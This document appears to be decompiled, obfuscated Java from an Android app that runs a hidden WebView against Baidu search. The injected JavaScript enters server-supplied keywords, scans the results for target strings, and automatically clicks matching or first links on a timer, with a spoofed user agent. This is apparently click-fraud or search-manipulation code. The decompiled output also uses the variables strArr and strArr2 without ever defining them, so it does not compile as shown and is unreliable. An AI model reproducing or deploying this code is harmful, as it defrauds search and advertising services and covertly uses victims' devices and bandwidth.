package com.amaz.onib;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Message;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
/* loaded from: classes.dex */
public class bj {

    /* loaded from: classes.dex */
    public interface a {
        void fail(com.amaz.onib.b bVar, int i, String str);
    }

    /* loaded from: classes.dex */
    public static final class b {

        /* renamed from: a  reason: collision with root package name */
        WebView f672a;
        com.amaz.onib.b b;
        a c;
        boolean d = false;
        private Handler e = new Handler() { // from class: com.amaz.onib.bj.b.1
            @Override // android.os.Handler
            public void handleMessage(Message message) {
                if (message.what == 1000 && !b.this.d && b.this.c != null) {
                    b.this.d = true;
                    b.this.c.fail(b.this.b, message.arg1, (String) message.obj);
                }
            }
        };

        public b(WebView webView, com.amaz.onib.b bVar, a aVar) {
            this.f672a = webView;
            this.b = bVar;
            this.c = aVar;
        }

        @JavascriptInterface
        public void fail(int i, String str) {
            bs.b(i + "#" + str);
            if (!this.d) {
                Message message = new Message();
                message.what = 1000;
                message.arg1 = i;
                message.obj = str;
                this.e.sendMessage(message);
            }
        }
    }

    public static void a(Context context, com.amaz.onib.b bVar, final boolean z, a aVar) {
        final long j;
        if (bVar != null && bVar.j != null && bVar.j.length != 0) {
            bs.b("Bdsweb...start....");
            WebView webView = new WebView(context);
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setPluginState(WebSettings.PluginState.ON);
            settings.setAllowFileAccess(true);
            settings.setUserAgentString(bVar.l);
            webView.loadUrl("https://www.baidu.com");
            webView.addJavascriptInterface(new b(webView, bVar, aVar), "jsj");
            final String[] split = (by.a(bVar.g) ? "################" : bVar.g).split(",");
            final String str = bVar.j[(int) (Math.random() * bVar.j.length)];
            bs.b("Bdsweb..." + str);
            try {
                j = 1000 * Long.parseLong(bVar.h);
            } catch (Exception e) {
                j = 3000;
            }
            bs.b("interval#" + j);
            webView.setWebViewClient(new WebViewClient() { // from class: com.amaz.onib.bj.1

                /* renamed from: a  reason: collision with root package name */
                int f671a = 0;

                @Override // android.webkit.WebViewClient
                public void onPageFinished(WebView webView2, String str2) {
                    String[] strArr;
                    String[] strArr2;
                    int i = 0;
                    super.onPageFinished(webView2, str2);
                    bs.b("onPageFinished: " + this.f671a + "#" + str2);
                    if (this.f671a == 0) {
                        StringBuffer stringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                        stringBuffer.append("newscript.innerHTML = '");
                        if (z) {
                            stringBuffer.append("var kw = document.getElementById(\\'kw\\');");
                            stringBuffer.append("kw.value = \\'").append(str).append("\\';");
                            stringBuffer.append("document.getElementById(\\'su\\').click();");
                            stringBuffer.append("var first;");
                            stringBuffer.append("var ttf;");
                            stringBuffer.append("function again(){");
                            stringBuffer.append("var tt = document.getElementById(\\'content_left\\').childNodes;");
                            stringBuffer.append("var bool = false;");
                            stringBuffer.append("for (i=0; i<tt.length; i++){");
                            stringBuffer.append("var out = tt[i].outerHTML;");
                            stringBuffer.append("if(out){");
                            stringBuffer.append("if(!first){ if(tt[i].childNodes[0].childNodes[0]){first=tt[i].childNodes[0].childNodes[0].href; ttf=tt[i].childNodes[0].childNodes[0].textContent;}}");
                            stringBuffer.append("if(");
                            int length = split.length;
                            while (i < length) {
                                stringBuffer.append("out.indexOf(\\'" + strArr2[i] + "\\')!=-1 || ");
                                i++;
                            }
                            if (split.length > 0) {
                                stringBuffer.delete(stringBuffer.length() - 3, stringBuffer.length());
                            }
                            stringBuffer.append("){");
                            stringBuffer.append("window.location.href = first;");
                            stringBuffer.append("jsj.fail(200, tt[i].childNodes[0].childNodes[0].textContent);");
                            stringBuffer.append("bool = true;");
                            stringBuffer.append("break;");
                            stringBuffer.append("}");
                            stringBuffer.append("}");
                            stringBuffer.append("}");
                            stringBuffer.append("if(!bool){");
                            stringBuffer.append("window.location.href = first;");
                            stringBuffer.append("jsj.fail(201, ttf);");
                            stringBuffer.append("}");
                            stringBuffer.append("}");
                            stringBuffer.append("window.setTimeout(\\'again()\\', ").append(j).append(");");
                        } else {
                            stringBuffer.append("var kw = document.getElementById(\\'index-kw\\');");
                            stringBuffer.append("kw.value = \\'").append(str).append("\\';");
                            stringBuffer.append("document.getElementById(\\'index-bn\\').click();");
                        }
                        stringBuffer.append("';");
                        stringBuffer.append("document.body.appendChild(newscript);");
                        webView2.loadUrl("javascript:" + stringBuffer.toString());
                        this.f671a++;
                    } else if (this.f671a == 1 && !z) {
                        StringBuffer stringBuffer2 = new StringBuffer("var newscript = document.createElement('script');");
                        stringBuffer2.append("newscript.innerHTML = '");
                        stringBuffer2.append("var tt = document.getElementById(\\'results\\').childNodes;");
                        stringBuffer2.append("var bool = false;");
                        stringBuffer2.append("var first;");
                        stringBuffer2.append("var ttf;");
                        stringBuffer2.append("for (i=0; i<tt.length; i++){");
                        stringBuffer2.append("var out = tt[i].outerHTML;");
                        stringBuffer2.append("if(out){");
                        stringBuffer2.append("if(!first){ if(tt[i].childNodes[0].childNodes[0]){first=tt[i].childNodes[0].childNodes[0].href; ttf=tt[i].childNodes[0].childNodes[0].textContent;}}");
                        stringBuffer2.append("if(");
                        int length2 = split.length;
                        while (i < length2) {
                            stringBuffer2.append("out.indexOf(\\'" + strArr[i] + "\\')!=-1 || ");
                            i++;
                        }
                        if (split.length > 0) {
                            stringBuffer2.delete(stringBuffer2.length() - 3, stringBuffer2.length());
                        }
                        stringBuffer2.append("){");
                        stringBuffer2.append("jsj.fail(200, tt[i].childNodes[0].childNodes[0].textContent);");
                        stringBuffer2.append("tt[i].childNodes[0].childNodes[0].click();");
                        stringBuffer2.append("bool = true;");
                        stringBuffer2.append("break;");
                        stringBuffer2.append("}");
                        stringBuffer2.append("}");
                        stringBuffer2.append("}");
                        stringBuffer2.append("if(!bool){");
                        stringBuffer2.append("jsj.fail(201, ttf);");
                        stringBuffer2.append("first.click();");
                        stringBuffer2.append("}");
                        stringBuffer2.append("';");
                        stringBuffer2.append("document.body.appendChild(newscript);");
                        webView2.loadUrl("javascript:" + stringBuffer2.toString());
                        this.f671a++;
                    }
                }

                @Override // android.webkit.WebViewClient
                public void onPageStarted(WebView webView2, String str2, Bitmap bitmap) {
                    super.onPageStarted(webView2, str2, bitmap);
                    bs.b("onPageStarted#" + this.f671a + "#" + str2);
                }
            });
        }
    }
}
